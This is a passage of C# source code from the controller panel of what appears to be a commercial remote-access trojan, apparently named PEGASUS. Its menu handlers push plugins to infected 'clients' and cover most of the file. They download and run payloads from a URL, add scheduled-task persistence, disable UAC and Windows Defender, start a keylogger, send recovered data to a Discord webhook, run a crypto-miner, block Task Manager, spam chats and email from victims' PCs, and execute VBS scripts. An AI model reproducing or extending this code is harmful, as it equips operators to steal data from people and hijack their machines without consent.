                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The sendFileFromUrlToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = InputDialog.Show("\nPayload link.\n");
                if (string.IsNullOrEmpty(Msgbox)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                packet.ForcePathObject("url").AsString = Msgbox;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "SendFileFromUrl: " + Path.GetFileName(Msgbox);
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The installSchtaskToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "InstallSchtask:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The disableUACToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "disableUAC";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "DisableUAC:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The disableWDToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(@"Plugins\KillTheBear.exe")));
                packet.ForcePathObject("Inject").AsString = "";

                var lv = new ListViewItem();
                lv.Text = "Disable Windows Defender:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SM.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The toolStripMenuItem68_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem68_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(@"Plugins\KL.exe")));
                packet.ForcePathObject("Inject").AsString = "";

                var lv = new ListViewItem();
                lv.Text = "Auto Keylogger:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SM.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The sKYNETToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void sKYNETToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Promitheas.dll");

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        /// <summary>
        /// The guna2Shapes4_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2Shapes4_Click(object sender, EventArgs e)
        {
            // if (buttonspanel.Visible == false)
            // {
            //     guna2Transition1.ShowSync(buttonspanel);
            // }

            // else
            // {
            //     guna2Transition2.HideSync(buttonspanel);

            //  }
            Process.Start("https://www.pantheon.one/video-gallery/");
        }

        /// <summary>
        /// The sKYNETSHOPToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void sKYNETSHOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.pantheon.one/shop/");
        }

        /// <summary>
        /// The toolStripMenuItem59_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem59_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.pantheon.one/video-gallery/");
        }

        /// <summary>
        /// The recoverAllSendToDiscordToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void recoverAllSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {

            FrmDiscordST3 formd = new FrmDiscordST3();
            formd.ShowDialog();
            //FrmDiscordST3 st = new FrmDiscordST3();
            //string Msgbox = st.txtWebHook.Text;

            //var Msgbox = InputDialog.Show("\nYour Discord Webhook.\n");
            //if (string.IsNullOrEmpty(Msgbox)) return;

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "StSStart";
                    packet.ForcePathObject("webhook").AsString = formd.txtWebHook.Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\StS.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The startToolStripMenuItem1_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void startToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            /*
            FormMiner formdn = new FormMiner();
            formdn.ShowDialog();
            string pool = Settings.pool;
            string wallet = Settings.wallet;
            string password = Settings.password;
            string threads = Settings.threads;
            string algo = Settings.algo;
            string allmerged = pool + Environment.NewLine + wallet + Environment.NewLine + password + Environment.NewLine + algo + Environment.NewLine + threads + Environment.NewLine;
            //string alltextdebug = Path.Combine(Application.StartupPath, "alltext.txt");
            */
            var pool = InputDialog.Show("\nType Pool:Port.\n\n");
            var wallet = InputDialog.Show("\nType Wallet.\n\n");
            var password = InputDialog.Show("\nType Password.\n\n");
            var algo = InputDialog.Show("\nType Algorithm.\n\n");
            var threadss = InputDialog.Show("\nType Threads.\n\n");

            if (string.IsNullOrEmpty(pool))
                return;
            if (string.IsNullOrEmpty(wallet))
                return;
            if (string.IsNullOrEmpty(password))
                return;
            if (string.IsNullOrEmpty(threadss))
                return;
            if (string.IsNullOrEmpty(algo)) return;

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "StartMiner";
                    packet.ForcePathObject("pool").AsString = pool;
                    packet.ForcePathObject("wallet").AsString = wallet;
                    packet.ForcePathObject("password").AsString = password;
                    packet.ForcePathObject("algo").AsString = algo;
                    packet.ForcePathObject("threads").AsString = threadss;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Miner.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The startToolStripMenuItem3_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void startToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "WatchDogStart";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\WatchDogs.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The stopToolStripMenuItem2_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem2_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "WatchDogStop";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\WatchDogs.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The startToolStripMenuItem4_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void startToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "TaskMgrStart";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\WatchDogs.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The stopToolStripMenuItem4_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "TaskMgrStop";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\WatchDogs.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The guna2Shapes2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2Shapes2_Click(object sender, EventArgs e)
        {
            using (var newinf = new Welcome())
            {
                newinf.ShowDialog();
            }
        }

        /// <summary>
        /// The PEGASUSMain_FormClosed.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="FormClosedEventArgs"/>.</param>
        private void PEGASUSMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            File.Delete(Path.GetTempPath() + @"\PEGASUSCertificate.p12");
            File.Delete(Path.GetTempPath() + @"\Client.exe");
            //if (File.Exists(Application.StartupPath + @"\Plugins"))
            //{

            //    DeleteDirectory(Application.StartupPath + @"\Plugins");
            //}

            // File.Delete(System.Windows.Forms.Application.UserAppDataPath + "\\tsimpouki");
            Environment.Exit(0);
        }

        /// <summary>
        /// The toolStripMenuItem82_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem82_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "RStart";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\PRP.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The toolStripMenuItem83_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem83_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "RStop";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\PRP.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The stopToolStripMenuItem1_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "doStop";
                        //packet.ForcePathObject("webhook").AsString = Msgbox;

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Miner.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        /// <summary>
        /// The openSupportTicketToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void openSupportTicketToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.pantheon.one/support/");
        }

        /// <summary>
        /// The toolStripMenuItem51_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem51_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The toolStripMenuItem53_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem53_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "normaluninstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The startToolStripMenuItem2_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void startToolStripMenuItem2_Click_1(object sender, EventArgs e)
        {
            /*
            var times = InputDialog.Show("\nHow many times do you want to send this message?.\n\n");
            var hook = InputDialog.Show("\nYour Discord Webhook.\n\n");
            var message = InputDialog.Show("\nMessage to send.\n\n");
            if (string.IsNullOrEmpty(times))
                return;
            if (string.IsNullOrEmpty(hook))
                return;
            if (string.IsNullOrEmpty(message))
                return;
            */
            FrmWebHookSPM formdn = new FrmWebHookSPM();
            formdn.ShowDialog();
            //FrmWebHookSPM sp = new FrmWebHookSPM();
            string hook = formdn.txtHook.Text;
            string message = formdn.txtMessage.Text;
            string times = formdn.txtTimes.Text;

            ExampleAsync(hook, message, Convert.ToString(times));

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var time = Convert.ToInt32(times);
                    LoopUtilities.Repeat(time, () => Execution(hook, message));
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The ExampleAsync.
        /// </summary>
        /// <param name="hook">The hook<see cref="string"/>.</param>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <param name="times">The times<see cref="string"/>.</param>
        /// <returns>The <see cref="Task"/>.</returns>
        public static async Task ExampleAsync(string hook, string message, string times)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "debug.txt");
            string[] lines = { hook, message, Convert.ToString((times)) };
            using StreamWriter file = new(path);

            foreach (string line in lines)
            {
                if (!line.Contains("Second"))
                {
                    await file.WriteLineAsync(line);
                }
            }
        }

        /// <summary>
        /// The Execution.
        /// </summary>
        /// <param name="hook">The hook<see cref="string"/>.</param>
        /// <param name="message">The message<see cref="string"/>.</param>
        public void Execution(string hook, string message)
        {
            var packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "WStart";
            packet.ForcePathObject("webhook").AsString = hook;
            packet.ForcePathObject("message").AsString = message;
            //packet.ForcePathObject("times").AsString = times;


            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SPM.dll");
            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

            foreach (var client in GetSelectedClients())
            {
                client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
        }

        /// <summary>
        /// The stopToolStripMenuItem5_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "WStop";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SPM.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        /// <summary>
        /// The chatSpammerToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void chatSpammerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var formdn = new FrmCSPM();
            formdn.ShowDialog();
            var message = Settings.message;
            if (string.IsNullOrEmpty(message)) return;

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "CStart";
                    packet.ForcePathObject("message").AsString = message;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SPM.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The sendEmailFromClientPCToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void sendEmailFromClientPCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                    using (var form = new FrmEmailer())
                    {
                        if (form.ShowDialog() == DialogResult.OK)
                        {
                            var packet = new MsgPack();
                            packet.ForcePathObject("Packet").AsString = "EmailSent";
                            EmlSettings.fromEmail = form.txttoEmail.Text;
                            packet.ForcePathObject("FromEmail").AsString = form.txtfromEmail.Text;

                            EmlSettings.toEmail = form.txttoEmail.Text;
                            packet.ForcePathObject("ToEmail").AsString = form.txttoEmail.Text;

                            EmlSettings.EmailPass = form.txtPassword.Text;
                            packet.ForcePathObject("Pass").AsString = form.txtPassword.Text;

                            EmlSettings.Body = form.txtBody.Text;
                            packet.ForcePathObject("Body").AsString = form.txtBody.Text;

                            EmlSettings.Subject = form.txtsubject.Text;
                            packet.ForcePathObject("Subject").AsString = form.txtsubject.Text;

                            EmlSettings.Host = form.txtHost.Text;
                            packet.ForcePathObject("Host").AsString = form.txtHost.Text;

                            EmlSettings.EmailPort = form.txtEmailPort.Text;
                            packet.ForcePathObject("Port").AsString = form.txtEmailPort.Text;

                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "plugin";
                            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SPM.dll");
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (var client in GetSelectedClients())
                            {
                                client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The executeVBSToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void executeVBSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "vbs files (*.vbs)|*.vbs|All files (*.*)|*.*";
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
